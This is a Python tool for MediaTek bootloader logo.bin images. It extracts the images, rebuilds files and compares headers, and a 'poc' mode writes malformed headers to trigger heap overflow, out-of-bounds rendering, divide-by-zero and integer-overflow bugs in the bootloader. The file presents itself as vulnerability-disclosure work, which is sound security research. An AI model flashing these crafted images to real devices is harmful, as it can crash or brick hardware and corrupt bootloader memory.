#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mtk_logo_tool.py
MTK LK logo.bin unpack / repack / PoC injector
- Based on Kadan's LogoBuilder (XDA 2012) behavior + lk.img static analysis
- Cross-platform (Python 3.7+, no external deps)
- For responsible disclosure to MediaTek PSIRT only

Subcommands:
  analyze  logo.bin                 Show all headers (auto-detect format)
  unpack   logo.bin -o DIR          Extract images + manifest.json
  pack     DIR -o logo_new.bin      Rebuild logo.bin from project
  poc      logo.bin -i N --vuln X   Inject PoC into image #N
  diff     A.bin B.bin              Diff headers/image sizes

PoC modes (--vuln):
  shift_neg     : header[0x27C]=0 (shift=-9)  → OOB render
  alloc_short   : header[0x28]=1, overflow aux→heap overflow
  div_zero      : src_width/height=0 → div-by-zero
  huge_w_h      : width=0xFFFFFFFF → integer overflow
  pattern       : only replace pixels (no header tamper)
"""
import struct, sys, os, json, zlib, argparse, hashlib
from pathlib import Path
from dataclasses import dataclass, field, asdict
from typing import List, Optional, Dict

HDR_SIZE   = 512
KNOWN_MAGICS = [0x58881688, 0x58891688, 0x1E1E1E1E]
BPP = {16, 24, 32}
FMT_RAW, FMT_RLE = 0, 1


# =============================================================
#  Minimal PNG encoder (no PIL dependency)
# =============================================================
def _png_chunk(tag: bytes, data: bytes) -> bytes:
    return (struct.pack(">I", len(data)) + tag + data +
            struct.pack(">I", zlib.crc32(tag + data) & 0xFFFFFFFF))

def write_png(path: str, w: int, h: int, rgb565_or_888, bpp: int):
    """bpp=16: bytes are RGB565 LE; bpp=24/32: bytes are BGR(A) per pixel."""
    raw = bytearray()
    if bpp == 16:
        for y in range(h):
            raw.append(0)  # filter: None
            row = rgb565_or_888[y*w*2:(y+1)*w*2]
            for x in range(w):
                v = row[x*2] | (row[x*2+1] << 8)
                r = ((v >> 11) & 0x1F) << 3
                g = ((v >> 5)  & 0x3F) << 2
                b = (v & 0x1F) << 3
                raw += bytes((r, g, b))
    else:
        step = 3 if bpp == 24 else 4
        for y in range(h):
            raw.append(0)
            row = rgb565_or_888[y*w*step:(y+1)*w*step]
            for x in range(w):
                i = x * step
                raw += bytes((row[i+2], row[i+1], row[i]))
    with open(path, "wb") as f:
        f.write(b"\x89PNG\r\n\x1a\n")
        f.write(_png_chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0)))
        f.write(_png_chunk(b"IDAT", zlib.compress(bytes(raw), 9)))
        f.write(_png_chunk(b"IEND", b""))


# =============================================================
#  MTK logo header (auto-detect variants)
# =============================================================
@dataclass
class MtkHeader:
    offset:      int = 0          # offset in file where this header starts
    magic:       int = 0
    bpp:         int = 0
    fmt:         int = 0
    data_size:   int = 0
    width:       int = 0
    height:      int = 0
    alloc_hint:  int = 0          # [0x28]
    aux:         bytes = b""      # [0x2A..0x4E]
    pitch:       int = 0
    src_width:   int = 0
    src_height:  int = 0
    checksum:    int = 0
    shift_base:  int = 0          # [0x27C] low 12 bits
    raw:         bytes = b""      # full 512 bytes for diff
    
    def payload_size(self) -> int:
        """Calculated pixel payload size for RAW (ignores data_size if wrong)."""
        return (self.width * self.height * self.bpp) // 8

    def detected_variant(self) -> str:
        """Guess which known MTK layout this is."""
        if self.magic == 0x58881688:
            if self.bpp in (16, 24) and self.data_size > 0:
                return "MT65xx/MT67xx packed"
            return "MT67xx extended"
        if self.magic == 0:
            return "unpacked/raw"
        return f"unknown(magic=0x{self.magic:08x})"

    def to_bytes(self) -> bytes:
        hdr = bytearray(self.raw[:HDR_SIZE] if self.raw else bytes(HDR_SIZE))
        struct.pack_into("<I", hdr, 0x00, self.magic & 0xFFFFFFFF)
        struct.pack_into("<H", hdr, 0x06, self.bpp & 0xFFFF)
        struct.pack_into("<H", hdr, 0x08, self.fmt & 0xFFFF)
        struct.pack_into("<I", hdr, 0x0C, self.data_size & 0xFFFFFFFF)
        struct.pack_into("<I", hdr, 0x18, self.width  & 0xFFFFFFFF)
        struct.pack_into("<I", hdr, 0x1C, self.height & 0xFFFFFFFF)
        struct.pack_into("<I", hdr, 0x28, self.alloc_hint & 0xFFFFFFFF)
        if self.aux:
            hdr[0x2A:0x2A+min(0x24, len(self.aux))] = self.aux[:0x24]
        struct.pack_into("<I", hdr, 0x48, self.pitch & 0xFFFFFFFF)
        struct.pack_into("<I", hdr, 0x50, self.src_width  & 0xFFFFFFFF)
        struct.pack_into("<I", hdr, 0x54, self.src_height & 0xFFFFFFFF)
        struct.pack_into("<I", hdr, 0x58, self.checksum & 0xFFFFFFFF)
        struct.pack_into("<H", hdr, 0x27C, self.shift_base & 0x0FFF)
        return bytes(hdr)


def parse_header(data: bytes, offset: int) -> Optional[MtkHeader]:
    """Try to parse a 512B header at offset. Returns None if not valid."""
    if offset + HDR_SIZE > len(data):
        return None
    h = data[offset:offset+HDR_SIZE]
    magic = struct.unpack_from("<I", h, 0x00)[0]
    if magic not in KNOWN_MAGICS:
        return None
    bpp = struct.unpack_from("<H", h, 0x06)[0]
    fmt = struct.unpack_from("<H", h, 0x08)[0]
    if bpp not in BPP:
        return None
    mh = MtkHeader(
        offset=offset, magic=magic, bpp=bpp, fmt=fmt,
        data_size = struct.unpack_from("<I", h, 0x0C)[0],
        width     = struct.unpack_from("<I", h, 0x18)[0],
        height    = struct.unpack_from("<I", h, 0x1C)[0],
        alloc_hint= struct.unpack_from("<I", h, 0x28)[0],
        aux       = bytes(h[0x2A:0x2A+0x24]),
        pitch     = struct.unpack_from("<I", h, 0x48)[0],
        src_width = struct.unpack_from("<I", h, 0x50)[0],
        src_height= struct.unpack_from("<I", h, 0x54)[0],
        checksum  = struct.unpack_from("<I", h, 0x58)[0],
        shift_base= struct.unpack_from("<H", h, 0x27C)[0],
        raw       = bytes(h),
    )
    # sanity
    if mh.width == 0 or mh.height == 0:
        return None
    if mh.width > 8192 or mh.height > 8192:
        return None
    return mh


# =============================================================
#  logo.bin parser / builder
# =============================================================
@dataclass
class LogoImage:
    header: MtkHeader
    pixels: bytes = b""

class LogoBin:
    def __init__(self, path: Optional[str] = None):
        self.images: List[LogoImage] = []
        self.raw_size: int = 0
        self.tail: bytes = b""      # trailing bytes after last image
        if path:
            self.load(path)

    # ---------- parse ----------
    def load(self, path: str):
        data = Path(path).read_bytes()
        self.raw_size = len(data)
        offset = 0
        while offset < len(data):
            h = parse_header(data, offset)
            if h is None:
                # try to resync (some bins pad to 0x1000 boundaries)
                nxt = ((offset // 0x1000) + 1) * 0x1000
                if nxt + HDR_SIZE <= len(data) and parse_header(data, nxt):
                    offset = nxt
                    continue
                break
            payload_len = self._image_payload_len(h, data, offset + HDR_SIZE)
            px = data[offset+HDR_SIZE: offset+HDR_SIZE+payload_len]
            self.images.append(LogoImage(h, px))
            offset += HDR_SIZE + payload_len
        self.tail = data[offset:]

    @staticmethod
    def _image_payload_len(h: MtkHeader, data: bytes, start: int) -> int:
        # Try data_size first; if invalid, use calculated size
        if h.fmt == FMT_RAW:
            calc = (h.width * h.height * h.bpp) // 8
            if h.data_size and 0 < h.data_size <= calc * 2:
                return h.data_size
            return calc
        # For RLE, trust data_size; else scan until next header
        if h.data_size and h.data_size < len(data) - start:
            return h.data_size
        # fallback: scan for next magic
        for probe in range(start, min(start + 32*1024*1024, len(data) - 4), 4):
            if struct.unpack_from("<I", data, probe)[0] in KNOWN_MAGICS:
                return probe - start
        return len(data) - start

    # ---------- write ----------
    def to_bytes(self) -> bytes:
        out = bytearray()
        for img in self.images:
            out += img.header.to_bytes()
            out += img.pixels
        out += self.tail
        return bytes(out)

    def save(self, path: str):
        Path(path).write_bytes(self.to_bytes())

    # ---------- project ----------
    def unpack_project(self, outdir: str):
        p = Path(outdir)
        p.mkdir(parents=True, exist_ok=True)
        manifest = []
        for i, img in enumerate(self.images):
            h = img.header
            write_png(str(p / f"image_{i:03d}.png"),
                      h.width, h.height, img.pixels, h.bpp)
            manifest.append({
                "index": i,
                "magic": f"0x{h.magic:08x}",
                "bpp": h.bpp,
                "format": h.fmt,
                "width": h.width,
                "height": h.height,
                "data_size": h.data_size,
                "alloc_hint": h.alloc_hint,
                "src_width": h.src_width,
                "src_height": h.src_height,
                "checksum": f"0x{h.checksum:08x}",
                "shift_base": h.shift_base,
                "variant": h.detected_variant(),
                "header_sha1": hashlib.sha1(h.raw).hexdigest(),
            })
        (p / "manifest.json").write_text(json.dumps(manifest, indent=2))
        # project file (Kadan-style: just width,height)
        if self.images:
            (p / ".project").write_text(
                f"{self.images[0].header.width}\n{self.images[0].header.height}\n")
        print(f"[+] unpacked {len(self.images)} images to {outdir}")

    @classmethod
    def pack_project(cls, indir: str) -> "LogoBin":
        p = Path(indir)
        manifest_path = p / "manifest.json"
        if not manifest_path.exists():
            sys.exit("[-] manifest.json not found in project dir")
        manifest = json.loads(manifest_path.read_text())
        lb = cls()
        for entry in manifest:
            # load original header bytes from JSON + regenerate header
            h = MtkHeader(
                magic=int(entry["magic"], 16),
                bpp=entry["bpp"], fmt=entry["format"],
                data_size=entry["data_size"],
                width=entry["width"], height=entry["height"],
                alloc_hint=entry["alloc_hint"],
                src_width=entry["src_width"], src_height=entry["src_height"],
                checksum=int(entry["checksum"], 16),
                shift_base=entry["shift_base"],
            )
            # read pixel data from PNG (we re-encode to match bpp)
            png_path = p / f"image_{entry['index']:03d}.png"
            if png_path.exists():
                h2, px = _load_png_as_bpp(str(png_path), h.bpp, h.width, h.height)
                h.data_size = len(px) if h.fmt == FMT_RAW else h.data_size
                h.checksum = _compute_checksum(px)
            else:
                print(f"[!] {png_path} missing, keeping original size zeros")
                px = bytes((h.width * h.height * h.bpp) // 8)
            lb.images.append(LogoImage(h, px))
        print(f"[+] packed {len(lb.images)} images from {indir}")
        return lb


def _load_png_as_bpp(path: str, bpp: int, w: int, h: int):
    """Minimal PNG decoder for our own output (color type 2, filter 0)."""
    data = Path(path).read_bytes()
    # parse chunks
    pos = 8
    idat = b""
    ihdr = None
    while pos < len(data):
        ln = struct.unpack_from(">I", data, pos)[0]
        tag = data[pos+4:pos+8]
        payload = data[pos+8:pos+8+ln]
        if tag == b"IHDR":
            ihdr = struct.unpack(">IIBBBBB", payload)
        elif tag == b"IDAT":
            idat += payload
        elif tag == b"IEND":
            break
        pos += 12 + ln
    if ihdr is None:
        raise ValueError("bad PNG")
    pw, ph, _, ct, _, _, _ = ihdr
    if ct != 2:
        raise ValueError("only color-type 2 supported")
    raw = zlib.decompress(idat)
    row_bytes = pw * 3 + 1
    rgb_rows = []
    for y in range(ph):
        row = raw[y*row_bytes:(y+1)*row_bytes]
        if row[0] != 0:
            raise ValueError("only filter 0 supported")
        rgb_rows.append(row[1:])
    # resize/nearest to requested w,h
    out = bytearray()
    for y in range(h):
        sy = min(ph-1, y * ph // h)
        srow = rgb_rows[sy]
        for x in range(w):
            sx = min(pw-1, x * pw // w)
            r = srow[sx*3]; g = srow[sx*3+1]; b = srow[sx*3+2]
            if bpp == 16:
                v = ((r>>3)<<11) | ((g>>2)<<5) | (b>>3)
                out += struct.pack("<H", v)
            else:
                step = 3 if bpp == 24 else 4
                out += bytes((b, g, r)) if step == 3 else bytes((b, g, r, 0xFF))
    return None, bytes(out)


def _compute_checksum(px: bytes) -> int:
    """From disasm: 32-bit sum (sub_000259d8). Try both sum and sum^0xFFFFFFFF."""
    return sum(px) & 0xFFFFFFFF


# =============================================================
#  PoC payload generator
# =============================================================
def _pattern_pixels(w: int, h: int, bpp: int, kind="white") -> bytes:
    if bpp == 16:
        col = {"white": b"\xff\xff", "black": b"\x00\x00",
               "red": b"\x00\xf8", "green": b"\xe0\x07",
               "blue": b"\x1f\x00"}[kind]
        return col * (w * h)
    if bpp == 24:
        col = {"white": b"\xff\xff\xff", "black": b"\x00\x00\x00",
               "red": b"\x00\x00\xff", "green": b"\x00\xff\x00",
               "blue": b"\xff\x00\x00"}[kind]
        return col * (w * h)
    col = {"white": b"\xff\xff\xff\xff", "black": b"\x00\x00\x00\xff",
           "red": b"\x00\x00\xff\xff", "green": b"\x00\xff\x00\xff",
           "blue": b"\xff\x00\x00\xff"}[kind]
    return col * (w * h)


def inject_poc(lb: LogoBin, index: int, vuln: str, pattern="white") -> LogoBin:
    """Modify image at given index with PoC payload. Returns same object."""
    if index >= len(lb.images):
        sys.exit(f"[-] index {index} out of range (have {len(lb.images)})")
    img = lb.images[index]
    h = img.header
    w, h_ = h.width, h.height
    px = _pattern_pixels(w, h_, h.bpp, pattern)

    if vuln == "pattern":
        img.pixels = px
        h.checksum = _compute_checksum(px)
        h.data_size = len(px)
        print(f"[+] image #{index}: pixel pattern replaced ({pattern})")
        return lb

    if vuln == "shift_neg":
        h.shift_base = 0            # shift = 0 - 9 = -9 in sub_00015ce8
        print(f"[+] image #{index}: shift_base set to 0 (negative shift)")

    elif vuln == "alloc_short":
        h.alloc_hint = 1            # alloc(1) then 36-byte write
        h.aux = b"\x41" * 0x24      # 36 'A's overflow
        print(f"[+] image #{index}: alloc_hint=1, aux=36*A")

    elif vuln == "div_zero":
        h.src_width = 0
        h.src_height = 0
        print(f"[+] image #{index}: src_width/height=0 (div-by-zero path)")

    elif vuln == "huge_w_h":
        h.width = 0xFFFFFFFF
        h.height = 0xFFFFFFFF
        print(f"[+] image #{index}: width/height=0xFFFFFFFF (int overflow)")

    else:
        sys.exit(f"[-] unknown vuln: {vuln}")

    img.pixels = px
    h.checksum = _compute_checksum(px)
    h.data_size = len(px)
    return lb


# =============================================================
#  CLI
# =============================================================
def cmd_analyze(args):
    lb = LogoBin(args.input)
    print(f"[+] file: {args.input} ({lb.raw_size:,} bytes)")
    print(f"[+] images found: {len(lb.images)}")
    print(f"[+] trailing bytes: {len(lb.tail):,}")
    print()
    print(f"{'#':>3} {'off':>10} {'magic':>10} {'bpp':>4} {'fmt':>4} "
          f"{'WxH':>12} {'d_size':>10} {'csum':>10} {'shift':>5}  variant")
    print("-" * 100)
    for i, im in enumerate(lb.images):
        h = im.header
        print(f"{i:>3} 0x{h.offset:08x} 0x{h.magic:08x} "
              f"{h.bpp:>4} {h.fmt:>4} "
              f"{h.width}x{h.height:<6} {h.data_size:>10,} "
              f"0x{h.checksum:08x} {h.shift_base:>5}  {h.detected_variant()}")


def cmd_unpack(args):
    lb = LogoBin(args.input)
    lb.unpack_project(args.out)


def cmd_pack(args):
    lb = LogoBin.pack_project(args.indir)
    lb.save(args.out)
    print(f"[+] wrote {args.out} ({len(lb.to_bytes()):,} bytes)")


def cmd_poc(args):
    lb = LogoBin(args.input)
    inject_poc(lb, args.index, args.vuln, pattern=args.pattern)
    lb.save(args.out)
    total = len(lb.to_bytes())
    print(f"[+] wrote {args.out} ({total:,} bytes)")
    print(f"[!] Flash ONLY to your own test device. MTK PSIRT disclosure only.")


def cmd_diff(args):
    a = LogoBin(args.a)
    b = LogoBin(args.b)
    print(f"[A] {args.a} ({a.raw_size:,} bytes, {len(a.images)} images)")
    print(f"[B] {args.b} ({b.raw_size:,} bytes, {len(b.images)} images)")
    if len(a.images) != len(b.images):
        print(f"[!] image count differs")
    for i, (ia, ib) in enumerate(zip(a.images, b.images)):
        print(f"\n--- image #{i} ---")
        for f in ("magic", "bpp", "fmt", "width", "height",
                  "data_size", "alloc_hint", "src_width", "src_height",
                  "checksum", "shift_base"):
            va = getattr(ia.header, f)
            vb = getattr(ib.header, f)
            if va != vb:
                print(f"  {f:<12} : 0x{va:x}  →  0x{vb:x}")
        if ia.pixels != ib.pixels:
            print(f"  pixels       : differ ({len(ia.pixels)} vs {len(ib.pixels)} bytes)")


def main():
    ap = argparse.ArgumentParser(description="MTK logo.bin tool (multi-angle)")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("analyze", help="dump all headers")
    p.add_argument("input")
    p.set_defaults(func=cmd_analyze)

    p = sub.add_parser("unpack", help="extract images + manifest")
    p.add_argument("input")
    p.add_argument("-o", "--out", required=True)
    p.set_defaults(func=cmd_unpack)

    p = sub.add_parser("pack", help="rebuild logo.bin from project")
    p.add_argument("indir")
    p.add_argument("-o", "--out", required=True)
    p.set_defaults(func=cmd_pack)

    p = sub.add_parser("poc", help="inject PoC into image #N")
    p.add_argument("input")
    p.add_argument("-i", "--index", type=int, default=0)
    p.add_argument("--vuln", required=True,
                   choices=["pattern", "shift_neg", "alloc_short",
                            "div_zero", "huge_w_h"])
    p.add_argument("--pattern", default="white",
                   choices=["white", "black", "red", "green", "blue"])
    p.add_argument("-o", "--out", required=True)
    p.set_defaults(func=cmd_poc)

    p = sub.add_parser("diff", help="diff two logo.bin files")
    p.add_argument("a"); p.add_argument("b")
    p.set_defaults(func=cmd_diff)

    args = ap.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
